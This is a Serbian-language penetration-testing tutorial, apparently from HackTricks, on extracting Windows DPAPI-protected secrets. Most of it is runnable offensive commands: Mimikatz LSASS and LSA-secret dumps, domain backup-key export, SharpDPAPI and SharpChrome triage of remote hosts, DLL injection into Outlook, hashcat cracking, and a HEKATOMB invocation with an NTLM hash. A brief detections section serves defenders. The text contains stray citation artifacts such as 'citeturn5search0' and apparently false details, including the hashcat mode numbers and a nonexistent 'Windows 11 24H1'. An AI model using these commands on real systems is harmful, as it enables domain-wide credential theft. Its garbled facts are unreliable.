# DPAPI - Ekstrakcija Lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se prvenstveno koristi unutar Windows operativnog sistema za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći ili korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za programere omogućavajući im da enkriptuju podatke koristeći ključ izveden iz korisničkih lozinki ili, za sistemsku enkripciju, tajne autentifikacije domena sistema, čime se eliminiše potreba da programeri sami upravljaju zaštitom ključa za enkripciju.

Najčešći način korišćenja DPAPI je kroz **`CryptProtectData` i `CryptUnprotectData`** funkcije, koje omogućavaju aplikacijama da sigurno enkriptuju i dekriptuju podatke sa sesijom procesa koji je trenutno prijavljen. To znači da se enkriptovani podaci mogu dekriptuju samo od strane istog korisnika ili sistema koji ih je enkriptovao.

Pored toga, ove funkcije takođe prihvataju **`entropy` parametar** koji će takođe biti korišćen tokom enkripcije i dekripcije, stoga, da biste dekripovali nešto što je enkriptovano koristeći ovaj parametar, morate pružiti istu vrednost entropije koja je korišćena tokom enkripcije.

### Generisanje ključeva za korisnike

DPAPI generiše jedinstveni ključ (nazvan **`pre-key`**) za svakog korisnika na osnovu njihovih kredencijala. Ovaj ključ se izvodi iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika, ali na kraju se koristi SHA1. Na primer, za korisnike domena, **zavisi od HTLM haša korisnika**.

Ovo je posebno zanimljivo jer ako napadač može da dobije haš lozinke korisnika, može:

- **Dekriptovati bilo koje podatke koji su enkriptovani koristeći DPAPI** sa tim korisničkim ključem bez potrebe da kontaktira bilo koji API
- Pokušati da **provali lozinku** van mreže pokušavajući da generiše validan DPAPI ključ

Pored toga, svaki put kada neki podaci budu enkriptovani od strane korisnika koristeći DPAPI, generiše se novi **master ključ**. Ovaj master ključ je onaj koji se zapravo koristi za enkripciju podataka. Svakom master ključu se dodeljuje **GUID** (Globally Unique Identifier) koji ga identifikuje.

Master ključevi se čuvaju u **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** direktorijumu, gde je `{SID}` Security Identifier tog korisnika. Master ključ se čuva enkriptovan od strane korisničkog **`pre-key`** i takođe od strane **domen backup ključa** za oporavak (tako da se isti ključ čuva enkriptovan 2 puta sa 2 različite lozinke).

Napomena da je **domen ključ koji se koristi za enkripciju master ključa u domen kontrolerima i nikada se ne menja**, tako da ako napadač ima pristup domen kontroleru, može da dobije domen backup ključ i dekriptuje master ključeve svih korisnika u domenu.

Enkriptovani blobovi sadrže **GUID master ključa** koji je korišćen za enkripciju podataka unutar svojih zaglavlja.

> [!TIP]
> DPAPI enkriptovani blobovi počinju sa **`01 00 00 00`**

Pronađi master ključeve:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ovo je kako će izgledati skup Master ključeva korisnika:

![](<../../images/image (1121).png>)

### Generisanje ključeva mašine/sistema

Ovo je ključ koji se koristi za mašinu da enkriptuje podatke. Zasnovan je na **DPAPI_SYSTEM LSA tajni**, što je poseban ključ kojem može pristupiti samo SYSTEM korisnik. Ovaj ključ se koristi za enkripciju podataka koji treba da budu dostupni samom sistemu, kao što su kredencijali na nivou mašine ili tajne na nivou sistema.

Napomena da ovi ključevi **nemaju rezervnu kopiju domena**, tako da su dostupni samo lokalno:

- **Mimikatz** može da mu pristupi dumpovanjem LSA tajni koristeći komandu: `mimikatz lsadump::secrets`
- Tajna se čuva unutar registra, tako da administrator može **modifikovati DACL dozvole da bi mu pristupio**. Putanja registra je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Zaštićeni podaci od strane DPAPI

Među ličnim podacima zaštićenim od strane DPAPI su:

- Windows kredencijali
- Lozinke i podaci za automatsko popunjavanje Internet Explorer-a i Google Chrome-a
- Lozinke za e-mail i interne FTP naloge za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući ključeve za enkripciju
- Lozinke za veze sa udaljenim desktop-om, .NET Passport, i privatne ključeve za razne svrhe enkripcije i autentifikacije
- Mrežne lozinke koje upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger, i još mnogo toga
- Enkriptovani blobovi unutar registra
- ...

Podaci zaštićeni od strane sistema uključuju:
- Wifi lozinke
- Lozinke za zakazane zadatke
- ...

### Opcije za ekstrakciju master ključeva

- Ako korisnik ima privilegije domen admina, može pristupiti **ključu rezervne kopije domena** da dekriptuje sve master ključeve korisnika u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim administratorskim privilegijama, moguće je **pristupiti LSASS memoriji** da se izvuku DPAPI master ključevi svih povezanih korisnika i SYSTEM ključ.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA tajni** da dekriptuje glavne ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako je lozinka ili NTLM hash korisnika poznat, možete **dekriptovati glavne ključeve korisnika direktno**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste unutar sesije kao korisnik, moguće je zatražiti od DC-a **rezervnu ključ za dešifrovanje glavnih ključeva koristeći RPC**. Ako ste lokalni administrator i korisnik je prijavljen, mogli biste **ukrasti njegov sesijski token** za ovo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista trezora
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI Enkriptovanim Podacima

### Pronađite DPAPI Enkriptovane podatke

Uobičajeni **zaštićeni fajlovi** korisnika se nalaze u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Takođe proverite promenu `\Roaming\` u `\Local\` u gornjim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI enkriptovane blobove u fajl sistemu, registru i B64 blobovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Napomena da se [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz iste repozitorije) može koristiti za dešifrovanje osetljivih podataka kao što su kolačići koristeći DPAPI.

### Ključevi za pristup i podaci

- **Koristite SharpDPAPI** da dobijete akreditive iz DPAPI enkriptovanih fajlova iz trenutne sesije:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Dobijte informacije o akreditivima** kao što su enkriptovani podaci i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Pristupite masterključevima**:

Dešifrujte masterključ korisnika koji zahteva **ključ za rezervnu kopiju domena** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava ove argumente za dekripciju masterključa (obratite pažnju na to kako je moguće koristiti `/rpc` za dobijanje rezervnog ključa domena, `/password` za korišćenje lozinke u običnom tekstu, ili `/pvk` za određivanje DPAPI domena privatnog ključa...)
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrujte podatke koristeći master ključ**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava ove argumente za dekripciju `credentials|vaults|rdg|keepass|triage|blob|ps` (obratite pažnju na to kako je moguće koristiti `/rpc` za dobijanje rezervne ključeve domena, `/password` za korišćenje plaintext lozinke, `/pvk` za specifikaciju DPAPI domen privatnog ključa, `/unprotect` za korišćenje trenutne sesije korisnika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Dešifrujte neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Rukovanje Opcionalnom Entropijom ("Entropija treće strane")

Neke aplikacije prosleđuju dodatnu **entropiju** funkciji `CryptProtectData`. Bez ove vrednosti, blob ne može biti dekriptovan, čak i ako je poznat ispravan masterkey. Stoga je dobijanje entropije od suštinskog značaja kada se cilja na kredencijale zaštićene na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je DLL u režimu korisnika koji hvata DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku opcionalnu entropiju koja se prosledi. Pokretanje EntropyCapture u režimu **DLL-injection** protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` će generisati datoteku koja mapira svaki entropijski bafer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se dekriptovali podaci. citeturn5search0
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft je uveo **context 3** format masterkey-a počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) je dodao hash-mode-e **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3) omogućavajući GPU-akcelerirano razbijanje korisničkih lozinki direktno iz masterkey datoteke. Napadači mogu stoga izvesti napade sa rečnicima ili brute-force napade bez interakcije sa ciljnim sistemom. citeturn8search1

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može da analizira Credential i Vault blobove, dekriptuje ih sa otkrivenim ključevima i izvozi lozinke u čistom tekstu.

### Pristup podacima sa drugih mašina

U **SharpDPAPI i SharpChrome** možete da navedete opciju **`/server:HOST`** da biste pristupili podacima sa udaljene mašine. Naravno, morate biti u mogućnosti da pristupite toj mašini i u sledećem primeru se pretpostavlja da je **ključ za enkripciju rezervne domene poznat**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma i ekstrakciju rezervnog ključa kontrolera domena putem RPC-a. Skripta će zatim rešiti sve IP adrese računara i izvršiti smbclient na svim računarima kako bi preuzela sve DPAPI blobove svih korisnika i dekriptovala sve sa rezervnim ključem domena.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa listom računara iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski dumpovati tajne zaštićene DPAPI-jem. Verzija 2.x je uvela:

* Paralelnu kolekciju blobova sa stotina hostova
* Parsiranje **context 3** masterkeys i automatsku integraciju Hashcat-a
* Podršku za "App-Bound" enkriptovane kolačiće u Chrome-u (vidi sledeći odeljak)
* Novi **`--snapshot`** režim za ponovnu proveru krajnjih tačaka i razliku novokreiranih blobova citeturn1search2

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault datoteke koji može da izveze Hashcat/JtR formate i opcionalno automatski pokrene dekripciju. Potpuno podržava formate masterkey-a za mašine i korisnike do Windows 11 24H1. citeturn2search0


## Uobičajene detekcije

- Pristup datotekama u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim DPAPI povezanim direktorijumima.
- Posebno sa mrežne deljene mape kao što su **C$** ili **ADMIN$**.
- Korišćenje **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dumpovanje masterkeys.
- Događaj **4662**: *Operacija je izvršena na objektu* – može se korelirati sa pristupom **`BCKUPKEY`** objektu.
- Događaj **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ranjivosti i promene u ekosistemu

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao bi da prevari člana domena da preuzme zlonamerni DPAPI rezervni ključ, omogućavajući dekripciju korisničkih masterkeys. Ispravljeno u novembarskom kumulativnom ažuriranju – administratori bi trebali osigurati da su DC-ovi i radne stanice potpuno ažurirani. citeturn4search0
* **Chrome 127 “App-Bound” kolačić enkripcija** (jul 2024) zamenila je staru DPAPI zaštitu dodatnim ključem koji se čuva pod korisnikovim **Credential Manager**. Offline dekripcija kolačića sada zahteva i DPAPI masterkey i **GCM-om obavijen app-bound ključ**. SharpChrome v2.3 i DonPAPI 2.x mogu da povrate dodatni ključ kada se pokreću sa korisničkim kontekstom. citeturn0search0


## Reference

- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004
- https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
- https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/
- https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6
- https://github.com/Leftp/DPAPISnoop
- https://pypi.org/project/donpapi/2.0.0/

{{#include ../../banners/hacktricks-training.md}}
